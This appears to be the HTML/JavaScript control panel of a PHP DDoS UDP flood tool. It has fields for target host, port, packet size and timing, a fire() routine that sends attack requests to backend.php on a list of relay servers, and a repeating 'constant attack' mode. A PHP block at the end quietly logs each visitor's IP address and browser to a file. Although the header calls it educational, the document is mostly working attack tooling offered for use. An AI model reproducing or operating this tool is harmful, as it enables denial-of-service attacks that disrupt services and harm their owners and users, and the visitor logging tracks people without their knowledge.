<!--
  ui.html
   
	Script to perform a DDoS UDP Flood by PHP
 
	This tool is written on educational purpose, please use it on your own good faith.
  
  GNU General Public License version 2.0 (GPLv2)
	@version	0.1

-->
<!DOCTYPE html>
<html>
<head>
	<title>DDoS UDP Flood</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta name="generator" content="Geany 1.23.1" />
	<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
		<h1> DDOS PHP Script
		<small>Security of System</small>
		</h1>
		<div id="ddos" class="ddos-wrap">
			<div action="" class="ddos-form">
				<div class="row">
					<div class="col-sm-6">
						<button class="square-button" id="loadLag" onClick="javascript:lagConfig();">Lag ⚙️</button>
					</br></br>
					</div>
					<div class="col-sm-6">
						<button class="square-button" id="loadTraffic" onClick="javascript:trafficConfig();">Traffic ⚙️</button>
					</br></br>
					</div>
				</div>
				<div class="row">
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Host</label>
						<input type="text" id="host" class="form-control">
					</div>
					</div>
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Port</label>
						<input type="number" id="port" max=65535 min=1 step=1 value=80 class="form-control">
					</div>
					</div>
				</div>
				<div class="row">
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Packet</label>
						<input type="number" id="packet" min=1 step=1 class="form-control">
					</div>
					</div>
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Time</label>
						<input type="number" id="time" min=1 step=1 value=60 class="form-control">
					</div>
					</div>
				</div>
				<div class="row">	
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Bytes</label>
						<input type="number" id="bytes" max=65000 min=1 step=1 value=65000 class="form-control">
					</div>
					</div>
					<div class="col-sm-6">
					<div class="input-block">
						<label for="">Interval</label>
						<input type="number" id="interval" max=10000 min=1 step=1 value=10 class="form-control">
					</div>
					</div>
				</div>
				<div class="row">
					<div class="col-sm-12">
						<div class="input-block">
							<label for="">Password</label>
							<input type="text" id="pass" class="form-control">
						</div>
					</div>
				</div>
				<div class="row">
					<div class="col-sm-12">
					<button class="square-button" id="send" onClick="javascript:fire();">Fire</button>
					</br></br>
					</div>
				</div>
				<h2 style="text-align: center">Constant attack with smart delays</h2>
				<div class="row">
					<div class="col-sm-6">
						<button class="square-button" id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
					</br></br>
					</div>
					<div class="col-sm-6">
					<button class="square-button" id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
					</br></br>
					</div>
				</div>
				<div class="col-sm-12">
				<div class="input-block textarea">
					<label for="">Output</label>
					<textarea id="log" rows="10" cols="50" class="form-control"></textarea>
				</div>
				</div>
			</div>
		</div>

		<!-- follow on Git -->
		<div class="made-by">
		Made by 
		<a target="_blank" href="https://github.com/robertobarrosx">Roberto Barros</a>
		</div>
	<script>
		var _log=document.getElementById("log");
		var intervalHandler = null;
		function fire(){
			var host=document.getElementById("host").value;
			var port=document.getElementById("port").value;
			var packet=document.getElementById("packet").value;
			var time=document.getElementById("time").value;
			var pass=document.getElementById("pass").value;
			var bytes=document.getElementById("bytes").value;
			var interval=document.getElementById("interval").value;
			//dosList is used to place all servers where backend.php
			// is located thus performing a DDos attack instead of Dos
			var dosList= [
				"./",
			];
			if(host!="" && pass!=""){
				inputLock(true);
				i=0;
				var ajax = [];
				dosList.forEach(function(dosUrl){
					var url=dosUrl+'backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
					console.log(url);
					ajax[i] = $.ajax({
						url: url,
						method: 'POST',
						data: {},
						cache: false
					});
					i++;
				});
				i=0;
				dosList.forEach(function(dosUrl){
					$.when(ajax[i]).done(function(data){
						if(_log.value.includes("Wrong password")){
							constantAttack(false);
							_log.value = '';
						}
						_log.select();
						_log.value ='['+dosUrl+']\n'+ data +_log.value+'\n';
						if(intervalHandler == null){
							inputLock(false);
						}
					});
					i++;
				});
			}
			else{
				_log.select();
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function lagConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "10";
			bytes=document.getElementById("bytes").value = "1";
			interval=document.getElementById("interval").value = "0";
		}
		
		function trafficConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "60";
			bytes=document.getElementById("bytes").value = "65000";
			interval=document.getElementById("interval").value = "10";
		}
		
		function constantAttack(status){
			var host=document.getElementById("host").value;
			var host=document.getElementById("pass").value;
			var intervalTime=(document.getElementById("time").value * 1000) + 1000;
			if(host!="" && pass!=""){
				if(status == true){
					fire();
					inputLock(true);
					intervalHandler = setInterval(fire,intervalTime);
				}
				else if(status == false){
					clearInterval(intervalHandler);
					inputLock(false);
					intervalHandler = null;
				}
			}
			else{
				_log.select();
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function inputLock(status){
			var inputs = document.getElementsByTagName("input");
			var buttons = document.getElementsByTagName("button");
			if(status == true){
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = true;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = true;
				}
				document.getElementById("stopInterval").disabled = false;
			}
			else{
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = false;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = false;
				}
				document.getElementById("stopInterval").disabled = true;
			}
		}
	</script>
	<!--Design script-->
	<script>
	//material ddos form animation
		$('.ddos-form').find('.form-control').each(function() {
		var targetItem = $(this).parent();
		if ($(this).val()) {
			$(targetItem).find('label').css({
			'top': '10px',
			'fontSize': '14px'
			});
		}
		})
		$('.ddos-form').find('.form-control').focus(function() {
		$(this).parent('.input-block').addClass('focus');
		$(this).parent().find('label').animate({
			'top': '10px',
			'fontSize': '14px'
		}, 300);
		})
		$('.ddos-form').find('.form-control').blur(function() {
		if ($(this).val().length == 0) {
			$(this).parent('.input-block').removeClass('focus');
			$(this).parent().find('label').animate({
			'top': '25px',
			'fontSize': '18px'
			}, 300);
		}
		})
	</script>
</body>
</html>

<?php
$ip = getUserIP();
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
fwrite($file, $data);
fclose($file);


function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
?>
